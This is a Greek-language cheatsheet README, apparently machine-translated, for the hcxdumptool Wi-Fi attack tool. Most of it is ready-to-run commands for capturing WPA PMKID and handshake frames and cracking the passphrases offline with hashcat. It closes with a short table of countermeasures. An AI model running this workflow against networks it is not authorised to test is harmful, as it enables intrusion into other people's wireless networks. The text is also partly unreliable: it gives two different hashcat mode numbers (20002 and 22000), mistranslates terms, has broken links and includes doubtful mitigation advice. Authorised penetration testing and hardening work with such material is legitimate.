<!-- language-home-navigation -->
[🏠 Ελληνική Αρχική Σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# hcxdumptool Cheatsheet

Το [hcxdumptool](https://github.com/ZerBea/hcxdumptool) είναι ένα σύγχρονο, υψηλής απόδοσης εργαλείο επίθεσης Wi-Fi γραμμής εντολών και λήψης πακέτων. Σε αντίθεση με τα παλαιού τύπου εργαλεία Aircrack-ng, το `hcxdumptool` καταγράφει καρέ WPA/WPA2/WPA3 PMKID (Pairwise Master Key Identifier) ​​χωρίς να απαιτεί συνδεδεμένους πελάτες, συλλαμβάνει χειραψίες 4 κατευθύνσεων EAPOL και ενσωματώνεται απευθείας με το `hcxtools` για σπασίματα Hashcat (λειτουργία 20002).

---

## Πίνακας περιεχομένων

- [Core Advantages & Modern Architecture](#core-advantages--modern-architecture)
- [Εγκατάσταση (`hcxdumptool` & `hcxtools`)](#installation-hcxdumptool--hcxtools)
- [Ρύθμιση ασύρματης διεπαφής] (#wireless-interface-setup)
- [Capturing PMKID (Clientless Attack)] (#capturing-pmkid-clientless-attack)
- [Μετατροπή φωτογραφιών με `hcxpcapngtool`](#converting-captures-with-hcxpcapngtool)
- [Hashcat Cracking (Mode 22000)](#hashcat-cracking-mode-22000)
- [Filtering Channels and BSSIDs](#filtering-channels-and-bssids)
- [Defensive Countermeasures & WPA3](#defensive-countermeasures--wpa3)

---

## Βασικά Πλεονεκτήματα & Σύγχρονη Αρχιτεκτονική

- **Επίθεση PMKID χωρίς πελάτη:** Εκμεταλλεύεται τη δυνατότητα RSN IE (Ισχυρό στοιχείο πληροφοριών δικτύου ασφαλείας) PMKID σε σύγχρονους δρομολογητές. **Δεν** χρειάζεστε έναν συνδεδεμένο πελάτη ή πακέτα κατάργησης ταυτότητας για να καταγράψετε το βασικό υλικό.
- **Unified Hashcat Mode 22000:** Δημιουργεί εγγενή αρχεία κατακερματισμού Hashcat που υποστηρίζουν χειραψίες PMKID και πλήρεις WPA-PBKDF2-PMK.
- **Channel Hopping & Active Interrogation:** Μεταδίδει στοχευμένα αιτήματα συσχέτισης για να εξάγει PMKID από AP.

---

## Εγκατάσταση (`hcxdumptool` & `hcxtools`)
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## Ρύθμιση ασύρματης διεπαφής

Πριν εκτελέσετε το `hcxdumptool`, τερματίστε τις υπηρεσίες διαχείρισης δικτύου παρασκηνίου που παρεμβαίνουν στην έγχυση πρωτογενών πακέτων:
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## Λήψη PMKID (Επίθεση χωρίς πελάτη)

### 1. Γενική λήψη PMKID σε όλα τα κανάλια 2,4 GHz & 5 GHz
Καταγράψτε όλα τα κοντινά σημεία πρόσβασης σε ένα αρχείο `.pcapng`:
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`: Ασύρματη διεπαφή οθόνης.
- `-w capture.pcapng`: Εξαγωγή αρχείου λήψης.
- `--rds=1`: Μεταδώστε καρέ RTS για να ζητήσετε απαντήσεις AP.

### 2. Καταγράψτε ένα συγκεκριμένο σημείο πρόσβασης στόχου (Φίλτρο BSSID)
Στοχεύστε μόνο ένα εξουσιοδοτημένο BSSID για να αποτρέψετε τον επηρεασμό μη εξουσιοδοτημένων δρομολογητών τρίτων:

1. Δημιουργία λίστας φίλτρων προορισμού (`target_bssid.txt`):
```text
001122334455
```
*(BSSID χωρίς άνω και κάτω τελεία)*

2. Εκτελέστε στοχευμένη λήψη:
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`: Κλείδωμα έγχυσης και ακρόαση του καναλιού 6.
- `--bpfp`: Εφαρμόστε τη λίστα BPF (Berkeley Packet Filter) για BSSID-στόχους.

---

## Μετατροπή φωτογραφιών με `hcxpcapngtool`

Μόλις συλλεχθούν τα πλαίσια PMKID ή EAPOL, μετατρέψτε τη λήψη `.pcapng` σε μορφή συμβατή με Hashcat:
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`: Εξαγωγή αρχείου κατακερματισμού σε σύγχρονη μορφή Hashcat.
- `-E essid_list.txt`: Αποθηκεύστε τα ονόματα δικτύων που εντοπίστηκαν (ESSID) σε ένα λεξικό για στοχευμένη διάρρηξη κωδικού πρόσβασης.
- Το εργαλείο αναφέρει συνολικά εξαγόμενα πλαίσια PMKID και EAPOL.

---

## Hashcat Cracking (Λειτουργία 22000)

Η λειτουργία `22000` είναι η ενοποιημένη λειτουργία σπασίματος WPA-PBKDF2-PMKID + EAPOL της Hashcat:

### 1. Λεξικό Επίθεση
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. Επίθεση μετάλλαξης βάσει κανόνων
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. Μάσκα / Επίθεση ωμής δύναμης (8-ψήφιοι αριθμητικοί κωδικοί πρόσβασης)
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## Φιλτράρισμα καναλιών και BSSID

Βελτιστοποιήστε την ταχύτητα λήψης περιορίζοντας τις παραμέτρους σάρωσης:
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## Αμυντικά αντίμετρα & WPA3

| Ευπάθεια | Μηχανισμός Επίθεσης | Σύσταση Άμυνας |
|---|---|---|
| **Προσωρινή αποθήκευση PMKID** | Το AP μεταδίδει PMKID στο πλαίσιο EAPOL 1 χωρίς έλεγχο ταυτότητας πελάτη | Απενεργοποιήστε το 802.11r (Γρήγορη μετάβαση / Περιαγωγή) εάν δεν χρειάζεται. ενημέρωση υλικολογισμικού δρομολογητή. |
| **Αδύναμο προ-κοινόχρηστο κλειδί WPA2** | Σπάσιμο λεξικού PBKDF2 εκτός σύνδεσης (λειτουργία Hashcat 22000) | Επιβολή τυχαίων φράσεων πρόσβασης 16+ χαρακτήρων. |
| **Πρωτόκολλο WPA2 παλαιού τύπου** | Επιρρεπείς σε PMKID και σύλληψη χειραψίας | Αναβάθμιση σε **WPA3-Personal (SAE)**. Το WPA3 χρησιμοποιεί χειραψία Dragonfly με μυστικότητα προς τα εμπρός, καθιστώντας τα καταγεγραμμένα καρέ αδύναμα εκτός σύνδεσης. |